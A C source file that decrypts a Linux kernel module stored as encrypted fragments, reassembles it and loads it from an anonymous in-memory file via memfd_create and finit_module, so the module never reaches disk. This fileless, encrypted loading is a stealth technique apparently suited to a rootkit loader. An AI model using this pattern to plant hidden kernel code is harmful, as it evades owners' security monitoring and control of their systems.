#include "../include/load.h"
#include "../include/cipher.h"
#define _GNU_SOURCE
#include <linux/memfd.h>
#include <linux/module.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <stdlib.h>
#include <string.h>

uint8_t *decrypt_lkm(fraction_t *fractions, int fractions_count, ssize_t *len) {

  uint8_t *module = NULL;
  ssize_t total_size = 0;
  ssize_t module_size = 0;
  decrypted_t *decr;

  for (int i = 0; i < fractions_count; i++) {
    decr = decrypt_fraction(&fractions[i]);
    if (decr == NULL) {
      log_error("Decryption process failed");
      return NULL;
    }

    if (module == NULL) {
      total_size = decr->text_size;
      module = malloc(total_size);
      if (module == NULL) {
        log_error("Error in memory assigning");
        decrypted_free(decr);
        return NULL;
      }
    } else {
      total_size += decr->text_size;
      uint8_t *tmp = realloc(module, total_size);
      if (tmp == NULL) {
        log_error("Memory reallocation failed");
        free(module);
        decrypted_free(decr);
        return NULL;
      }
      module = tmp;
    }
    memcpy(module + module_size, decr->decrypted_text, decr->text_size);
    module_size += decr->text_size;

    decrypted_free(decr);
  }

  *len = module_size;
  return module;
}

int load_lkm(const uint8_t *lkm, ssize_t total_size) {

  int fdlkm = syscall(SYS_memfd_create, "lkmmod", 0);
  if (fdlkm < 0) {
    log_error("memfd_create failed");
    return -1;
  }

  ssize_t written_bytes = write(fdlkm, lkm, total_size);
  if (written_bytes < 0) {
    log_error("Error writing to memfd");
    close(fdlkm);
    return -1;
  } else if (written_bytes != total_size) {
    log_error("Incomplete write to memfd (Expected %zu, wrote %zd)",
              total_size, written_bytes);
    close(fdlkm);
    return -1;
  }

  if (syscall(SYS_finit_module, fdlkm, "", 0) != 0) {
    log_error("Failed to init module");
    close(fdlkm);
    return -1;
  }

  log_debug("Module loaded successfully");
  close(fdlkm);

  return 0;
}
